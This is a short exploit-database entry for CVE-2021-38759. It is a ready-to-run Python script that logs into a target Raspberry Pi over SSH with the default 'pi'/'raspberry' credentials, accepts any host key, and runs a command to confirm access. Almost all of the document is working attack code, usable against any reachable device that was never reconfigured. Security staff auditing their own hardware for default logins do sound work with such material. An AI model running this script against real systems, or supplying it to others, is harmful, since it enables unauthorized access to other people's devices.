# Exploit Title: Raspberry Pi 5.10 - Default Credentials
# Date: 08/12/2021
# Exploit Author: netspooky
# Vendor Homepage: https://www.raspberrypi.com/
# Software Link: https://www.raspberrypi.com/software/operating-systems/
# Version: Raspberry Pi OS <= 5.10
# Tested on: Raspberry Pi OS 5.10
# CVE : CVE-2021-38759

# Initial Release: https://twitter.com/netspooky/status/1468603668266209280

# Run: $ python3 exploit.py IP

import paramiko

import sys

h=sys.argv[1]

u="pi"

p="raspberry"

c=paramiko.client.SSHClient()

c.set_missing_host_key_policy(paramiko.AutoAddPolicy())

c.connect(h,username=u,password=p)

i,o,e=c.exec_command("id")

print(o.read())

c.close()
